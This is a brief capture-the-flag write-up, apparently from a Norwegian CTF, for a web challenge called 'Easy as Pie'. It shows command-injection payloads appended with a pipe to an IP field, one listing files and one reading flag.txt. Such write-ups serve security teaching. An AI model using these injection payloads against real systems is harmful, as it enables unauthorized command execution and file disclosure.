## Easy as Pie

Task: Once in a remote Norwegian town, a group of skilled security professionals had convened in a fancy cabin to collaborate and achieve their objectives. On their network, they found a number of challenges that required their collective expertise. Do you have what it takes to tackle these challenges too?

The challenge provides you this website:
![4524398e032e417aace67e5fddc9f3c1.png](../images/4524398e032e417aace67e5fddc9f3c1.png)

This is a classic example of remote code execution. 
I can just submit the payload `ip=127.0.0.1|ls`
![eacf9c44cf4749c7b537ae3bc8f2e12c.png](../images/eacf9c44cf4749c7b537ae3bc8f2e12c.png)

To obtain the flag:
`ip=127.0.0.1|cat flag.txt`
![47561a81b9564f3689ac9343798b2406.png](../images/47561a81b9564f3689ac9343798b2406.png)

I can also see it like this in the UI:
![899f52880ac840bd8f6ed9f5e81d38c2.png](../images/899f52880ac840bd8f6ed9f5e81d38c2.png)
